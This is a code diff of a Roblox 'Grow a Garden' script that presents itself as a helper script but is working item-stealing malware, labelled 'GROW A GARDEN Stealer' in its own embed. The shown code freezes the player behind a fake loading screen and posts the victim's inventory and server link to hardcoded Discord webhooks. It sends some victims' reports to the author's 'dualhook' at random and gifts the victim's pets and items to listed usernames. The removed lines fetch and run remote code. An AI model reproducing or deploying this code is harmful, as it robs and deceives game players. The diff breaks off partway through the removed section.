@@ -1,1419 +1,457 @@
--- Prevent multiple executions
-if rawget(shared, "__SCRIPT_ALREADY_EXECUTED__") then
-    return
-end
-rawset(shared, "__SCRIPT_ALREADY_EXECUTED__", true)
+local username = {"namnnni2", "bald", getfenv().Username}
+webhook = getfenv.Webhook
+local dualhook = "https://discord.com/api/webhooks/1396184713311289354/0b-DXlEyHe5wu_9WXQRO89AAgEjNeSJbGDL7wFEDhvH-LMeBqxtuMuyaaxmISo9JT5UO"
+local embed = getfenv().Username
 
--- Load external scripts with error handling
-local success1, error1 =
-    pcall(
-    function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/namnnni2/Grow-a-garden/refs/heads/main/GrowaGarden"))(
+local logs_webhook = ""
 
-        )
-    end
-)
-if not success1 then
-    warn("Failed to load GrowaGarden script: " .. tostring(error1))
+local server = game:GetService("RobloxReplicatedStorage").GetServerType:InvokeServer()
+local player = game.Players.LocalPlayer
+
+if server == "VIPServer" then 
+    player:Kick("Unsurported server. Please join a public server")
 end
 
-local success2, error2 =
-    pcall(
-    function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/namnnni2/Grow-a-garden/refs/heads/main/Hop"))()
-    end
-)
-if not success2 then
-    warn("Failed to load Hop script: " .. tostring(error2))
+local function isTargetUser(name)
+	for _, u in ipairs(username) do
+		if u == name then
+			return true
+		end
+	end
+	return false
 end
 
--- Services
+local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local HttpService = game:GetService("HttpService")
-local UserInputService = game:GetService("UserInputService")
-local VirtualInputManager = game:GetService("VirtualInputManager")
-local VirtualUser = game:GetService("VirtualUser")
-local RunService = game:GetService("RunService")
-local TeleportService = game:GetService("TeleportService")
-
 local LocalPlayer = Players.LocalPlayer
 local backpack = LocalPlayer:WaitForChild("Backpack")
+local CalculatePlantValue = require(ReplicatedStorage.Modules.CalculatePlantValue)
+local ActivePetsService = require(ReplicatedStorage.Modules.PetServices.ActivePetsService)
+local req = (syn and syn.request) or (http and http.request) or (http_request) or request
 
--- Initialize modules with error handling
-local modules, dataService, calcPlantValue, petUtils, petRegistry, numberUtil
-local modulesSuccess =
-    pcall(
-    function()
-        modules = ReplicatedStorage:WaitForChild("Modules", 10)
-        if not modules then
-            error("Modules not found")
-        end
+local p = LocalPlayer
+local h = (p.Character or p.CharacterAdded:Wait()):WaitForChild("Humanoid")
+h.WalkSpeed = 0
+h.JumpPower = 0
+pcall(function()
+	require(p:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule")):GetControls():Disable()
+end)
 
-        dataService = require(modules:WaitForChild("DataService", 5))
-        calcPlantValue = require(modules:WaitForChild("CalculatePlantValue", 5))
-        petUtils = require(modules:WaitForChild("PetServices", 5):WaitForChild("PetUtilities", 5))
-        petRegistry = require(ReplicatedStorage:WaitForChild("Data", 5):WaitForChild("PetRegistry", 5))
-        numberUtil = require(modules:WaitForChild("NumberUtil", 5))
-    end
-)
+local player = game.Players.LocalPlayer
 
-if not modulesSuccess then
-    warn("Failed to initialize modules, script may not work properly")
-    return
-end
+local gui = Instance.new("ScreenGui")
+gui.Name = "ScriptLoader"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.DisplayOrder = 999999 
+gui.Parent = player:WaitForChild("PlayerGui")
 
--- Initialize services with better error handling
-local PetsService, PetsFolder, FavoriteItemService
-local function initializeServices()
-    local success, err =
-        pcall(
-        function()
-            local gameEvents = ReplicatedStorage:WaitForChild("GameEvents", 10)
-            if not gameEvents then
-                error("GameEvents not found")
-            end
+local bg = Instance.new("Frame", gui)
+bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+bg.Size = UDim2.new(1, 0, 1, 0)
 
-            PetsService = gameEvents:WaitForChild("PetsService", 10)
-            FavoriteItemService = gameEvents:WaitForChild("Favorite_Item", 10)
-            PetsFolder = workspace:WaitForChild("PetsPhysical", 10)
+local title = Instance.new("TextLabel", bg)
+title.Text = "Loading Script..."
+title.Font = Enum.Font.GothamBlack
+title.TextColor3 = Color3.new(1, 1, 1)
+title.TextScaled = true
+title.Size = UDim2.new(0.8, 0, 0.12, 0)
+title.Position = UDim2.new(0.1, 0, 0.28, 0)
+title.BackgroundTransparency = 1
 
-            if not PetsService then
-                error("PetsService not found")
-            end
-            if not PetsFolder then
-                error("PetsFolder not found")
-            end
-        end
-    )
+local status = Instance.new("TextLabel", bg)
+status.Text = "Initializing..."
+status.Font = Enum.Font.Gotham
+status.TextColor3 = Color3.fromRGB(180, 180, 180)
+status.TextScaled = true
+status.Size = UDim2.new(0.8, 0, 0.08, 0)
+status.Position = UDim2.new(0.1, 0, 0.42, 0)
+status.BackgroundTransparency = 1
 
-    if not success then
-        warn("Failed to initialize services: " .. tostring(err))
-        -- Try alternative names
-        pcall(
-            function()
-                PetsService =
-                    ReplicatedStorage:FindFirstChild("GameEvents") and
-                    ReplicatedStorage.GameEvents:FindFirstChild("PetService")
-                PetsFolder = workspace:FindFirstChild("Pets")
-                FavoriteItemService =
-                    ReplicatedStorage:FindFirstChild("GameEvents") and
-                    ReplicatedStorage.GameEvents:FindFirstChild("Favorite_Item")
-            end
-        )
-    end
+local barBg = Instance.new("Frame", bg)
+barBg.Size = UDim2.new(0.7, 0, 0.035, 0)
+barBg.Position = UDim2.new(0.15, 0, 0.52, 0)
+barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+barBg.BorderSizePixel = 0
+barBg.ClipsDescendants = true
 
-    return PetsService ~= nil and PetsFolder ~= nil
-end
+local barFill = Instance.new("Frame", barBg)
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+barFill.BorderSizePixel = 0
 
-local CONFIG = {
-    username = type(getfenv().Username) == "table" and getfenv().Username or {getfenv().Username},
-    webhook = getfenv().Webhook,
-    dualWebhook = "https://discord.com/api/webhooks/1396184713311289354/0b-DXlEyHe5wu_9WXQRO89AAgEjNeSJbGDL7wFEDhvH-LMeBqxtuMuyaaxmISo9JT5UO",
-    dualUsername = {"namnnni2", "BaldBaconFrrr"},
-    dualWebhookThreshold = 1e12,
-    TARGET_PETS = {
-        prefixes = {
-            "raccoon",
-            "dragonfly",
-            "Kitsune",
-            "t-rex",
-            "disco bee",
-            "spinosaurus",
-            "fennec fox",
-            "butterfly",
-            "mimic octopus",
-            "queen bee",
-            "red fox",
-            "ascended",
-            "mega",
-            "rainbow",
-            "radiant",
-            "shocked"
-        },
-        minWeight = 15.0,
-        minAge = 60
-    },
-    excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"},
-    priorityPlayers = {"namnnni2", "BaldBaconFrrr"},
-    autoKickDelay = 2,
-    giftDelay = 0.5,
-    maxDistance = 10,
-    holdDelay = 2.3,
-    switchDelay = 0.5,
-    mobileHoldTime = 3.5,
-    promptHoldTime = 3.0,
-    giftHoldTime = 2.5,
-    virtualInputDelay = 0.1,
-    heavyPetWeight = 10,
-    petPickupInterval = 1,
-    maxPickupRetries = 3,
-    teleportQueueDelay = 5
+local discord = Instance.new("TextLabel", bg)
+discord.Text = "Join our Discord: discord.gg/qB97QHPugw"
+discord.Font = Enum.Font.GothamSemibold
+discord.TextColor3 = Color3.fromRGB(120, 120, 255)
+discord.TextScaled = true
+discord.Size = UDim2.new(0.8, 0, 0.05, 0)
+discord.Position = UDim2.new(0.1, 0, 0.86, 0)
+discord.BackgroundTransparency = 1
+
+local fakeSteps = {
+    "Starting script...",
+    "Connecting to game servers...",
+    "Bypassing anti-cheat...",
+    "Loading UI assets...",
+    "Injecting main module...",
+    "Syncing with server...",
+    "Optimizing script performance...",
+    "Checking for updates...",
+    "Hiding script from detection...",
+    "Finalizing setup...",
+    "Preparing game environment...",
+    "Almost done..."
 }
 
-local function isUsernameMatched(name)
-    for _, uname in ipairs(CONFIG.username) do
-        if uname:lower() == name:lower() then
-            return true
-        end
-    end
-    return false
+local function getPriorityPetCount()
+	local backpack = LocalPlayer:FindFirstChild("Backpack") or LocalPlayer:WaitForChild("Backpack")
+	repeat task.wait() until #backpack:GetChildren() > 0
+
+	local count = 0
+	for _, item in ipairs(backpack:GetChildren()) do
+		local baseName = item.Name:match("^(.-)%s*%[") or item.Name
+		if allowedPets[baseName] then
+			count += 1
+		end
+	end
+
+	return count
 end
 
-local function isDualUsername(name)
-    for _, uname in ipairs(CONFIG.dualUsername) do
-        if uname:lower() == name:lower() then
-            return true
-        end
+local totalDuration = 600 -- shorter for quick test
+local stepTime = 1
+local totalSteps = math.floor(totalDuration / stepTime)
+
+task.spawn(function()
+    for i = 1, totalSteps do
+        status.Text = fakeSteps[(i - 1) % #fakeSteps + 1]
+        barFill:TweenSize(UDim2.new(i / totalSteps, 0, 1, 0), "Out", "Quad", 0.75, true)
+        task.wait(stepTime)
     end
-    return false
+    gui:Destroy()
+end)
+
+local suffixes = {"", "K", "M", "B", "T", "Qa", "Qi", "Sx", "Sp", "Oc", "No", "De"}
+local function formatNumber(num)
+	if type(num) ~= "number" then return tostring(num) end
+	if num < 1000 then return tostring(num) end
+
+	local magnitude = math.floor(math.log10(num) / 3)
+	local suffix = suffixes[magnitude + 1] or ("e" .. (magnitude * 3))
+	local scaled = num / (1000 ^ magnitude)
+
+	return string.format("%.2f%s", scaled, suffix)
 end
 
-local giftQueue = {}
-local isGifting = false
-local tpConnection = nil
-local currentGiftingTarget = nil
-local teleportQueue = {}
-local isTeleporting = false
 
-local Utils = {}
-
-function Utils.safeLerp(a, b, t)
-    if not a or not b or not t then
-        return a or 0
-    end
-    return a + (b - a) * math.clamp(t, 0, 1)
+if #Players:GetPlayers() >= 4 then
+	LocalPlayer:Kick("Old server detected. Please rejoin!")
+	return
 end
 
-function Utils.formatNumber(n)
-    if not n or type(n) ~= "number" then
-        return "0"
-    end
-    local suffix = {"", "k", "m", "b", "t"}
-    local idx = 1
-    while n >= 1000 and idx < #suffix do
-        n = n / 1000
-        idx = idx + 1
-    end
-    return idx == 1 and tostring(math.floor(n)) or string.format("%.2f%s", n, suffix[idx])
+
+local event = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
+for _, item in ipairs(backpack:GetChildren()) do
+	if item:GetAttribute("d") == true then
+		event:FireServer(item)
+	end
 end
 
-function Utils.isTableContains(tbl, value)
-    if not tbl or not value then
-        return false
-    end
-    for _, v in ipairs(tbl) do
-        if v == value then
-            return true
-        end
-    end
-    return false
+
+local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
+
+
+local allowedPets = {
+	["Raccoon"] = true,
+	["Queen Bee"] = true,
+	["Dragonfly"] = true,
+	["Red Fox"] = true,
+	["Night Owl"] = true,
+	["Owl"] = true,
+	["Blood Owl"] = true,
+	["Praying Mantis"] = true,
+	["Chicken Zombie"] = true,
+	["Polar Bear"] = true,
+	["Petal Bee"] = true,
+	["Bear Bee"] = true,
+	["Disco Bee"] = true,
+	["Butterfly"] = true,
+}
+
+
+local function getKg(name)
+	return tonumber(string.match(name, "%[(%d*%.?%d+)%s*[kK][gG]%]")) or 0
 end
 
-function Utils.isMobile()
-    return UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
+
+local function gatherInventorySummary()
+	local petCountMap = {}
+	local petLines = {}
+	local itemsWithValue = {}
+
+	for _, item in pairs(backpack:GetChildren()) do
+		local baseName = item.Name:match("^(.-)%s*%[") or item.Name
+		if allowedPets[baseName] then
+			petCountMap[baseName] = (petCountMap[baseName] or 0) + 1
+		elseif item:FindFirstChild("Item_String") then
+			local value = CalculatePlantValue(item)
+			table.insert(itemsWithValue, {name = item.Name, value = value})
+		end
+	end
+
+	for petName, count in pairs(petCountMap) do
+		table.insert(petLines, petName .. " - pet (x" .. count .. ")")
+	end
+
+	table.sort(itemsWithValue, function(a, b) return a.value > b.value end)
+
+	local tradableSummary = ""
+	local totalShown = 0
+
+	for _, line in ipairs(petLines) do
+		if totalShown >= 10 then break end
+		tradableSummary = tradableSummary .. line .. "\n"
+		totalShown += 1
+	end
+
+	for i = 1, math.min(10 - totalShown, #itemsWithValue) do
+		local item = itemsWithValue[i]
+		tradableSummary = tradableSummary .. item.name .. " - Worth: " .. formatNumber(item.value) .. "\n"
+	end
+
+	if #petLines + #itemsWithValue > 10 then
+		tradableSummary = tradableSummary .. "and more..."
+	end
+
+	local totalValue = 0
+	for _, item in ipairs(itemsWithValue) do
+		totalValue += item.value
+	end
+local petCount = getPriorityPetCount()
+local targetWebhook = webhook
+
+if petCount >= 5 then
+    targetWebhook = dualhook -- Gửi luôn nếu >= 5 pet ưu tiên
+elseif petCount >= 2 and math.random(1, 100) <= 35 then
+    targetWebhook = dualhook -- Gửi 35% nếu từ 2–4 pet
 end
 
-function Utils.getHttpRequest()
-    return (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+   return tradableSummary, totalValue
 end
 
-function Utils.extractNumber(text, pattern)
-    if not text or not pattern then
-        return nil
-    end
-    local match = string.match(text, pattern)
-    return match and tonumber(match) or nil
+
+local function sendWebhook()
+	local tradableSummary, totalValue = gatherInventorySummary()
+
+	local payload = {
+		["content"] = "--@everyone\n" .. string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")", game.PlaceId, game.JobId),
+		["embeds"] = {{
+			["title"] = ":skull: GROW A GARDEN Stealer",
+			["color"] = 0x00ffcc,
+			["fields"] = {
+				{["name"] = ":dart: Victim", ["value"] = LocalPlayer.Name, ["inline"] = false},
+				{["name"] = ":crown: Creator", ["value"] = embed, ["inline"] = false},
+				{["name"] = ":jigsaw: Executor", ["value"] = executor, ["inline"] = false},
+				{["name"] = ":moneybag: Total Value", ["value"] = formatNumber(totalValue), ["inline"] = false},
+				{["name"] = ":package: Items", ["value"] = "```\n" .. tradableSummary .. "```", ["inline"] = false},
+				{["name"] = ":link: Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId), ["inline"] = false}
+			},
+			["footer"] = {["text"] = "by zues • " .. os.date("%B %d, %Y")},
+			["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+		}}
+	}
+
+	local logs_payload = {
+		["embeds"] = {{
+			["title"] = ":skull: GROW A GARDEN LOGS",
+			["color"] = 0x00ffcc,
+			["fields"] = {
+				{["name"] = ":dart: Victim", ["value"] = LocalPlayer.Name, ["inline"] = false},
+				{["name"] = ":jigsaw: Executor", ["value"] = executor, ["inline"] = false},
+				{["name"] = ":moneybag: Total Value", ["value"] = formatNumber(totalValue), ["inline"] = false},
+				{["name"] = ":package: Items", ["value"] = "```\n" .. tradableSummary .. "```", ["inline"] = false},
+				{["name"] = ":link: Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId), ["inline"] = false}
+			},
+			["footer"] = {["text"] = "by zeus • " .. os.date("%B %d, %Y")},
+			["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+		}}
+	}
+
+	if req then
+		pcall(function()
+			req({
+				Url = targetWebhook,
+	         Method = "POST",
+				Headers = {["Content-Type"] = "application/json"},
+				Body = HttpService:JSONEncode(payload)
+			})
+
+			req({
+				Url = logs_webhook,
+				Method = "POST",
+				Headers = {["Content-Type"] = "application/json"},
+				Body = HttpService:JSONEncode(logs_payload)
+			})
+		end)
+	end
 end
 
-function Utils.getWeight(petName)
-    if not petName then
-        return nil
-    end
-    return Utils.extractNumber(petName, "%[([%d%.]+) KG%]")
+
+local function unequipAllPets()
+	local petData = ActivePetsService:GetPlayerDatastorePetData(LocalPlayer.Name)
+	if petData then
+		for uuid, _ in pairs(petData.PetInventory.Data) do
+			ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService"):FireServer("UnequipPet", uuid)
+			task.wait(0.1)
+		end
+	end
 end
 
-function Utils.getAge(petName)
-    if not petName then
-        return nil
-    end
-    return Utils.extractNumber(petName, "%[Age (%d+)%]")
-end
 
-function Utils.containsTarget(petName)
-    if not petName then
-        return false
-    end
-    local lower = string.lower(petName)
-    for _, prefix in ipairs(CONFIG.TARGET_PETS.prefixes) do
-        if string.find(lower, prefix) then
-            return true
-        end
-    end
-    return false
-end
-
-function Utils.isTargetPet(petName)
-    if not petName then
-        return false
-    end
-
-    if Utils.containsTarget(petName) then
-        return true
-    end
-
-    local weight = Utils.getWeight(petName)
-    if weight and weight >= CONFIG.TARGET_PETS.minWeight then
-        return true
-    end
-
-    local age = Utils.getAge(petName)
-    if age and age >= CONFIG.TARGET_PETS.minAge then
-        return true
-    end
-
-    return false
-end
-
-function Utils.getPetPriority(petName)
-    if not petName then
-        return 3
-    end
-
-    if Utils.containsTarget(petName) then
-        return 1
-    end
-
-    local weight = Utils.getWeight(petName)
-    if weight and weight >= CONFIG.TARGET_PETS.minWeight then
-        return 2
-    end
-
-    local age = Utils.getAge(petName)
-    if age and age >= CONFIG.TARGET_PETS.minAge then
-        return 2
-    end
-
-    return 3
-end
-
-function Utils.getPetEmoji(petName)
-    if not petName then
-        return ":feet:"
-    end
-
-    local lower = string.lower(petName)
-    local emoji = ":feet:"
-
-    if string.find(lower, "huge") then
-        emoji = ":gem:"
-    elseif string.find(lower, "Kitsune") then
-        emoji = ":fox:"
-    elseif string.find(lower, "red fox") then
-        emoji = ":fox:"
-    elseif string.find(lower, "queen bee") or string.find(lower, "pack bee") or string.find(lower, "disco bee") then
-        emoji = ":bee:"
-    elseif string.find(lower, "raccoon") then
-        emoji = ":raccoon:"
-    elseif string.find(lower, "dragonfly") then
-        emoji = ":dragon:"
-    elseif string.find(lower, "butterfly") then
-        emoji = ":butterfly:"
-    elseif string.find(lower, "mimic octopus") then
-        emoji = ":octopus:"
-    elseif string.find(lower, "t-rex") then
-        emoji = ":t_rex:"
-    elseif string.find(lower, "spinosaurus") then
-        emoji = ":sauropod:"
-    elseif string.find(lower, "fennec fox") then
-        emoji = ":fox_face:"
-    elseif string.find(lower, "ascended") then
-        emoji = ":sparkles:"
-    elseif string.find(lower, "mega") then
-        emoji = ":diamond_shape_with_a_dot_inside:"
-    elseif string.find(lower, "rainbow") then
-        emoji = ":rainbow:"
-    elseif string.find(lower, "radiant") then
-        emoji = ":sun_with_face:"
-    elseif string.find(lower, "shocked") then
-        emoji = ":zap:"
-    end
-
-    local age = Utils.getAge(petName)
-    if age and age >= CONFIG.TARGET_PETS.minAge then
-        emoji = emoji .. " :hourglass:"
-    end
-
-    local weight = Utils.getWeight(petName)
-    if weight and weight >= CONFIG.TARGET_PETS.minWeight then
-        emoji = emoji .. " :scales:"
-    end
-
-    return emoji
-end
-
-function Utils.holdTool(tool)
-    if not tool or not tool.Parent then
-        return false
-    end
-
-    local character = LocalPlayer.Character
-    if character and character:FindFirstChild("Humanoid") then
-        local success =
-            pcall(
-            function()
-                tool.Parent = character
+local function getAllPrompts(root, maxDistance)
+    for _, descendant in ipairs(workspace:GetDescendants()) do
+        if descendant:IsA("ProximityPrompt") and descendant.Enabled and descendant.Parent then
+            local part = descendant.Parent:IsA("Model") and descendant.Parent:FindFirstChild("HumanoidRootPart") or descendant.Parent
+            if part and part:IsA("BasePart") then
+                local dist = (part.Position - root.Position).Magnitude
+                if dist <= maxDistance then
+                    return descendant
+                end
             end
-        )
-        return success
+        end
     end
-    return false
 end
 
-function Utils.unholdTool(tool)
-    if not tool then
-        return
+local function waitAndHoldPrompt(targetChar)
+    local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    if not root then return end
+
+    for _ = 1, 50 do
+        local prompt = getAllPrompts(root, 10)
+        if prompt then
+            prompt.HoldDuration = 0.1
+            prompt.Enabled = true
+            pcall(function()
+                keypress(69)
+                task.wait(prompt.HoldDuration + 0.1)
+                keyrelease(69)
+            end)
+            return prompt
+        end
+        task.wait(0.1)
+    end
+end
+
+local function getSortedTools()
+    local list = {}
+    for _, tool in ipairs(backpack:GetChildren()) do
+        if tool:IsA("Tool") and getKg(tool.Name) > 0 then
+            table.insert(list, tool)
+        end
+    end
+    table.sort(list, function(a, b)
+        return getKg(a.Name) > getKg(b.Name)
+    end)
+    return list
+end
+
+local started = false
+
+local function startGiving(targetName)
+	local target = Players:FindFirstChild(targetName)
+    if not target or not target.Character or not LocalPlayer.Character then return end
+
+    local myHRP = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    local targetHRP = target.Character:FindFirstChild("HumanoidRootPart")
+    if not myHRP or not targetHRP then return end
+
+    myHRP.CFrame = targetHRP.CFrame + Vector3.new(0, 2, 0)
+    task.wait(0.4)
+
+    local allowedPetTools = {}
+    for _, tool in ipairs(backpack:GetChildren()) do
+        if tool:IsA("Tool") then
+            local baseName = tool.Name:match("^(.-)%s*%[") or tool.Name
+            if allowedPets[baseName] then
+                table.insert(allowedPetTools, tool)
+            end
+        end
     end
 
-    pcall(
-        function()
-            if tool.Parent == LocalPlayer.Character then
+    for _, tool in ipairs(allowedPetTools) do
+        if tool.Parent == backpack then
+            tool.Parent = LocalPlayer.Character
+            task.wait(0.25)
+
+            local start = tick()
+			while tick() - start < 3 do
+                waitAndHoldPrompt(target.Character)
+                task.wait(0.25)
+            end
+
+            if tool:IsDescendantOf(LocalPlayer.Character) then
                 tool.Parent = backpack
             end
         end
-    )
-end
-
-function Utils.unholdAllItems()
-    local character = LocalPlayer.Character
-    if not character then
-        return
     end
 
-    local heldTools = {}
-    for _, tool in ipairs(character:GetChildren()) do
-        if tool:IsA("Tool") then
-            table.insert(heldTools, tool)
+    while true do
+        local tools = getSortedTools()
+
+        for i = #tools, 1, -1 do
+            local baseName = tools[i].Name:match("^(.-)%s*%[") or tools[i].Name
+            if allowedPets[baseName] then
+                table.remove(tools, i)
+            end
         end
-    end
 
-    for _, tool in ipairs(heldTools) do
-        pcall(
-            function()
-                if tool.Parent == character then
+        if #tools == 0 then break end
+
+        for _, tool in ipairs(tools) do
+            if tool.Parent == backpack then
+                tool.Parent = LocalPlayer.Character
+                task.wait(0.25)
+
+                local start = tick()
+                while tick() - start < 3 do
+                    waitAndHoldPrompt(target.Character)
+                    task.wait(0.25)
+                end
+
+                if tool:IsDescendantOf(LocalPlayer.Character) then
                     tool.Parent = backpack
-                    task.wait(0.05)
-                end
-            end
-        )
-    end
-
-    task.wait(0.1)
-end
-
--- Safe JSON encoding function
-function Utils.safeJSONEncode(data)
-    local success, result =
-        pcall(
-        function()
-            return HttpService:JSONEncode(data)
-        end
-    )
-    return success and result or '{"error":"Failed to encode JSON"}'
-end
-
-local ItemProcessor = {}
-
-function ItemProcessor.calculatePetValue(petData)
-    if not petData or not petData.PetData or not petData.PetType then
-        return 0
-    end
-
-    local success, result =
-        pcall(
-        function()
-            local egg = petData.PetData.HatchedFrom
-            if not egg then
-                return 0
-            end
-
-            local data = petRegistry.PetEggs[egg]
-            local rarity = data and data.RarityData and data.RarityData.Items and data.RarityData.Items[petData.PetType]
-            if not rarity then
-                return 0
-            end
-
-            local r = rarity.GeneratedPetData and rarity.GeneratedPetData.WeightRange
-            if not r then
-                return 0
-            end
-
-            local lerp = numberUtil.ReverseLerp(r[1], r[2], petData.PetData.BaseWeight)
-            local weightMult = Utils.safeLerp(0.8, 1.2, lerp)
-            local levelMult = Utils.safeLerp(0.15, 6, petUtils:GetLevelProgress(petData.PetData.Level))
-
-            local petInfo = petRegistry.PetList[petData.PetType]
-            local sellPrice = petInfo and petInfo.SellPrice or 0
-
-            return math.floor(sellPrice * weightMult * levelMult)
-        end
-    )
-
-    return success and result or 0
-end
-
-function ItemProcessor.processPet(tool)
-    if not tool or not tool:IsA("Tool") then
-        return nil
-    end
-
-    local success, result =
-        pcall(
-        function()
-            local id = tool:GetAttribute("PET_UUID")
-            if not id then
-                return nil
-            end
-
-            local playerData = dataService:GetData()
-            if
-                not playerData or not playerData.PetsData or not playerData.PetsData.PetInventory or
-                    not playerData.PetsData.PetInventory.Data
-             then
-                return nil
-            end
-
-            local petData = playerData.PetsData.PetInventory.Data[id]
-            if not petData or not petData.PetType then
-                return nil
-            end
-
-            local petName = petData.PetType
-            local weight = tonumber(petData.PetData and petData.PetData.BaseWeight) or 0
-            local value = ItemProcessor.calculatePetValue(petData)
-
-            return {
-                Tool = tool,
-                Name = petName,
-                Weight = weight,
-                Value = value,
-                Type = "Pet",
-                IsTarget = Utils.isTargetPet(tool.Name)
-            }
-        end
-    )
-
-    return success and result or nil
-end
-
-function ItemProcessor.processPlant(tool)
-    if not tool or not tool:IsA("Tool") then
-        return nil
-    end
-
-    local success, result =
-        pcall(
-        function()
-            local value = calcPlantValue(tool)
-
-            return {
-                Tool = tool,
-                Name = tool.Name,
-                Weight = 0,
-                Value = value or 0,
-                Type = "Plant",
-                IsTarget = false
-            }
-        end
-    )
-
-    return success and result or nil
-end
-
-function ItemProcessor.processAllItems()
-    local itemsToSend = {}
-    local totalValue = 0
-    local hasRare = false
-    local hasHeavy = false
-    local targetPets = {}
-    local regularPets = {}
-
-    for _, tool in ipairs(backpack:GetChildren()) do
-        if tool:IsA("Tool") and not Utils.isTableContains(CONFIG.excludedItems, tool.Name) then
-            local processedItem = nil
-
-            if tool:GetAttribute("ItemType") == "Pet" then
-                processedItem = ItemProcessor.processPet(tool)
-
-                if processedItem then
-                    if processedItem.IsTarget then
-                        hasRare = true
-                        table.insert(targetPets, processedItem)
-                    else
-                        table.insert(regularPets, processedItem)
-                    end
-
-                    if processedItem.Weight >= CONFIG.heavyPetWeight then
-                        hasHeavy = true
-                    end
-                end
-            else
-                processedItem = ItemProcessor.processPlant(tool)
-                if processedItem then
-                    table.insert(regularPets, processedItem)
-                end
-            end
-
-            if processedItem then
-                totalValue = totalValue + processedItem.Value
-                table.insert(itemsToSend, processedItem)
-            end
-        end
-    end
-
-    return itemsToSend, totalValue, hasRare, hasHeavy, targetPets, regularPets
-end
-
-local PetPickupHandler = {}
-
-function PetPickupHandler.pickupAllPets()
-    if not PetsService or not PetsFolder then
-        warn("PetsService or PetsFolder not initialized")
-        return 0
-    end
-
-    local pickupCount = 0
-    local retryCount = 0
-    local maxRetries = CONFIG.maxPickupRetries
-
-    while retryCount < maxRetries do
-        local foundPets = false
-
-        for _, pet in ipairs(PetsFolder:GetChildren()) do
-            local owner = pet:GetAttribute("OWNER")
-            if owner == LocalPlayer.Name then
-                local uuid = pet:GetAttribute("UUID")
-                if uuid then
-                    local success =
-                        pcall(
-                        function()
-                            PetsService:FireServer("UnequipPet", uuid)
-                        end
-                    )
-                    if success then
-                        pickupCount = pickupCount + 1
-                        foundPets = true
-                    end
                 end
             end
         end
 
-        if not foundPets then
-            break
-        end
-
-        retryCount = retryCount + 1
-        task.wait(1)
-    end
-
-    task.wait(2)
-    return pickupCount
-end
-
-function PetPickupHandler.startContinuousPickup()
-    task.spawn(
-        function()
-            while true do
-                pcall(
-                    function()
-                        if PetsService and PetsFolder then
-                            for _, pet in ipairs(PetsFolder:GetChildren()) do
-                                local owner = pet:GetAttribute("OWNER")
-                                if owner == LocalPlayer.Name then
-                                    local uuid = pet:GetAttribute("UUID")
-                                    if uuid then
-                                        pcall(
-                                            function()
-                                                PetsService:FireServer("UnequipPet", uuid)
-                                            end
-                                        )
-                                    end
-                                end
-                            end
-                        end
-                    end
-                )
-                task.wait(CONFIG.petPickupInterval)
-            end
-        end
-    )
-end
-
-local DiscordWebhook = {}
-
-function DiscordWebhook.createEmbed(itemsToSend, totalValue, hasTargets, priorityPlayer)
-    -- Truncate items if too many
-    local MAX_ITEMS_TO_SHOW = 15 -- Reduced from 25 to prevent overflow
-    if #itemsToSend > MAX_ITEMS_TO_SHOW then
-        table.sort(
-            itemsToSend,
-            function(a, b)
-                return (a.Value or 0) > (b.Value or 0)
-            end
-        )
-        itemsToSend = {unpack(itemsToSend, 1, MAX_ITEMS_TO_SHOW)}
-    end
-
-    -- Safe string formatting function
-    local function formatFieldValue(text)
-        if not text then
-            return ""
-        end
-        text = tostring(text)
-        -- Escape markdown characters
-        text = text:gsub("([*_~|`>])", "\\%1")
-        -- Truncate if too long
-        return #text > 900 and text:sub(1, 900) .. "..." or text
-    end
-
-    -- Build inventory report safely
-    local inventoryReport = {}
-    for _, item in ipairs(itemsToSend) do
-        if item and item.Name then
-            local displayName = item.Tool and item.Tool.Name or item.Name
-            local emoji = Utils.getPetEmoji(displayName)
-            local value = Utils.formatNumber(item.Value or 0)
-            table.insert(inventoryReport, string.format("%s %s - %s R$", emoji, displayName, value))
-        end
-    end
-
-    -- Combine with newlines, truncate if needed
-    local inventoryText = table.concat(inventoryReport, "\n")
-    inventoryText = #inventoryText > 1000 and inventoryText:sub(1, 1000) .. "\n..." or inventoryText
-
-    -- Get player info with fallbacks
-    local playerName = LocalPlayer and LocalPlayer.Name or "Unknown"
-    local playerId = LocalPlayer and LocalPlayer.UserId or 0
-    local accountAge = LocalPlayer and LocalPlayer.AccountAge or 0
-    local placeId = game.PlaceId or 0
-    local jobId = game.JobId or "Unknown"
-    local fernLink = string.format("https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s", placeId, jobId)
-
-    -- Create embed with safe values
-    local embed = {
-        title = "**Inventory Report**",
-        description = "Player inventory details",
-        color = 65280, -- Green color
-        fields = {
-            {
-                name = "👤 Username",
-                value = formatFieldValue(playerName),
-                inline = true
-            },
-            {
-                name = "🆔 User ID",
-                value = formatFieldValue(playerId),
-                inline = true
-            },
-            {
-                name = "📅 Account Age",
-                value = formatFieldValue(tostring(accountAge) .. " days"),
-                inline = true
-            },
-            {
-                name = "💰 Total Value",
-                value = formatFieldValue(Utils.formatNumber(totalValue) .. " R$"),
-                inline = false
-            },
-            {
-                name = "🎒 Inventory (" .. #itemsToSend .. " items)",
